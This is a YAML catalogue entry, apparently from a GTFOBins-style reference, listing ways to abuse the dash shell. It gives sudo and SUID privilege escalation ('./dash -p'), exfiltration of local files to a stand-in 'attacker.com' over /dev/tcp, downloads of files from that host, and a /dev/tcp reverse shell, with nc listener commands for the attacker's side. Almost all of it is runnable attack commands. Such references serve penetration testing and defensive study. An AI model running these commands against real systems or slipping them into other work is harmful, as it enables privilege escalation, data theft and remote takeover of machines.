---
functions:
  exec-interactive:
    - code: dash
  sudo-enabled:
    - code: sudo dash
  suid-enabled:
    - code: ./dash -p
  upload:
    - description: Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        export LFILE=file_to_send
        dash -c 'echo -e "POST / HTTP/0.9\n\n$(cat $LFILE)" > /dev/tcp/$RHOST/$RPORT'
    - description: Send local file using a TCP connection. Run `nc -l -p 12345 > "where_to_save"` on the attacker box to collect the file.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        export LFILE=file_to_send
        dash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'
  download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        export LFILE=file_to_get
        dash -c '(echo -e "GET /$LFILE HTTP/0.9\r\n\r\n" 1>&3 & cat 0<&3) 3<>/dev/tcp/$RHOST/$RPORT | (read i; while [ "$(echo $i | tr -d \"\r\")" != "" ]; do read i; done; cat) > $LFILE'
    - description: Fetch remote file using a TCP connection. Run `nc -l -p 12345 < "file_to_send"` on the attacker box to send the file.
      code: |-
        export RHOST=attacker.com
        export RPORT=12345
        export LFILE=file_to_get
        dash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
  reverse-shell:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        dash -c 'dash -i >& /dev/tcp/$RHOST/$RPORT 0>&1'
---
